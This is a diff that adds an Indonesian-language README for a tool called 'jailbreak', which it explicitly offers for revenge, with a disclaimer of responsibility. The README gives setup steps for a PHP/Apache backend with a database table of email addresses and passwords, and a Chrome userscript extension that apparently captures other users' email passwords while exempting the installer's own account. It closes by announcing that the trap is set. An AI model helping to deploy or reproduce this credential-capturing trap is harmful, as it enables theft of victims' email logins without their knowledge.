@@ -1,0 +1,27 @@
+PERINGATAN !
+
+applikasi ini boleh disalah gunakan untuk anda yang balas dendam ! dan jika anda tidak balas dendam, silahkan balas dengan SMS.
+saya tidak bertanggung jawab atas kesalahan yang anda perbuat, karena anda yang berbuat anda yang menanggung. anda yang kebanjiran maka buatlah rumah panggung
+
+How to !
+
+install paketan apache2 dan php
+sudo apt-get install apache2 php5
+setalah itu copy folder jailbreak ke web root anda /var/www
+
+setelah itu buat database bernama "store" dan tabel baru bernama
+"user".
+skema tabel
+id = INT = AUTO_INCREMENT
+imel = VARCHAR = 99
+paspord = VARCHAR = 99
+
+setelah itu atur database config di /var/www/jailbreak/index.php
+
+buka file userkey.user.js
+cari line imel == 'freakout.jq'
+
+ganti freakout.jq dengan email anda. untuk mengamankan agar password email anda tidak di store ke database.
+
+setelah itu masuk ke google chrome. lalu buka userkey.user.js dan pasang sebagai ekstensi.
+oke sekarang jebakan sudah dipasang !!
